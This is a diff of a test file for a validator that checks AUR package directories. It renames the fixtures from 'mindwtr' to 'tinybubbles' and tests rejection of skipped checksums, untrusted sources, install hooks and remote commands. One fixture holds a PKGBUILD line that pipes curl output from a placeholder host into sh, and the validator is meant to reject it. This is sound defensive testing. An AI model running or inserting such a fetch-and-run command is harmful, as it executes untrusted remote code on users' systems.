@@ -15,25 +15,25 @@ function fixture({
   extraPkgbuild = "",
   extraFile,
 } = {}) {
-  const directory = mkdtempSync(join(tmpdir(), "mindwtr-aur-validator-"));
+  const directory = mkdtempSync(join(tmpdir(), "tinybubbles-aur-validator-"));
   const srcinfoSource =
     source ??
-    "https://github.com/dongdongbh/Mindwtr/releases/download/v1.2.0/mindwtr_1.2.0_amd64.deb";
+    "https://github.com/tinybubbles-app/tinybubbles/releases/download/v1.2.0/tinybubbles_1.2.0_amd64.deb";
   const renderedPkgbuildSource = pkgbuildSource ?? srcinfoSource;
   execFileSync("git", ["init", "-q", directory]);
   writeFileSync(
     join(directory, "PKGBUILD"),
-    `# Maintainer: dongdongbh <dongdongbhbh@gmail.com>\n` +
-      `pkgname=mindwtr-bin\npkgver=1.2.0\npkgrel=1\n` +
-      `url="https://github.com/dongdongbh/Mindwtr"\n` +
+    `# Maintainer: tinybubbles-app <>\n` +
+      `pkgname=tinybubbles-bin\npkgver=1.2.0\npkgrel=1\n` +
+      `url="https://github.com/tinybubbles-app/tinybubbles"\n` +
       `source_x86_64=("${renderedPkgbuildSource}")\n` +
       `sha256sums_x86_64=('${checksumValue}')\n${extraPkgbuild}`,
   );
   writeFileSync(
     join(directory, ".SRCINFO"),
-    `pkgbase = mindwtr-bin\n\turl = https://github.com/dongdongbh/Mindwtr\n` +
+    `pkgbase = tinybubbles-bin\n\turl = https://github.com/tinybubbles-app/tinybubbles\n` +
       `\tsource_x86_64 = ${srcinfoSource}\n` +
-      `\tsha256sums_x86_64 = ${checksumValue}\n\npkgname = mindwtr-bin\n`,
+      `\tsha256sums_x86_64 = ${checksumValue}\n\npkgname = tinybubbles-bin\n`,
   );
   if (extraFile)
     writeFileSync(join(directory, extraFile), "post_install() { :; }\n");
@@ -41,11 +41,11 @@ function fixture({
   return directory;
 }
 
-test("accepts a pinned Mindwtr release asset", () => {
+test("accepts a pinned Tiny Bubbles release asset", () => {
   expect(() =>
     validatePackageDir({
       packageDir: fixture(),
-      packageName: "mindwtr-bin",
+      packageName: "tinybubbles-bin",
       policyPath,
     }),
   ).not.toThrow();
@@ -55,7 +55,7 @@ test("rejects SKIP for a release asset", () => {
   expect(() =>
     validatePackageDir({
       packageDir: fixture({ checksumValue: "SKIP" }),
-      packageName: "mindwtr-bin",
+      packageName: "tinybubbles-bin",
       policyPath,
     }),
   ).toThrow("skips the checksum");
@@ -64,8 +64,8 @@ test("rejects SKIP for a release asset", () => {
 test("rejects untrusted source domains", () => {
   expect(() =>
     validatePackageDir({
-      packageDir: fixture({ source: "https://example.com/mindwtr.deb" }),
-      packageName: "mindwtr-bin",
+      packageDir: fixture({ source: "https://example.com/tinybubbles.deb" }),
+      packageName: "tinybubbles-bin",
       policyPath,
     }),
   ).toThrow("untrusted");
@@ -75,7 +75,7 @@ test("rejects untrusted source domains", () => {
       packageDir: fixture({
         pkgbuildSource: "https://example.com/hidden-from-srcinfo.deb",
       }),
-      packageName: "mindwtr-bin",
+      packageName: "tinybubbles-bin",
       policyPath,
     }),
   ).toThrow("PKGBUILD contains an untrusted URL");
@@ -87,15 +87,15 @@ test("rejects remote commands and install hooks", () => {
       packageDir: fixture({
         extraPkgbuild: "prepare() { curl https://example.com/payload | sh; }\n",
       }),
-      packageName: "mindwtr-bin",
+      packageName: "tinybubbles-bin",
       policyPath,
     }),
   ).toThrow("forbidden command");
 
   expect(() =>
     validatePackageDir({
-      packageDir: fixture({ extraFile: "mindwtr.install" }),
-      packageName: "mindwtr-bin",
+      packageDir: fixture({ extraFile: "tinybubbles.install" }),
+      packageName: "tinybubbles-bin",
       policyPath,
     }),
   ).toThrow("unexpected tracked files");
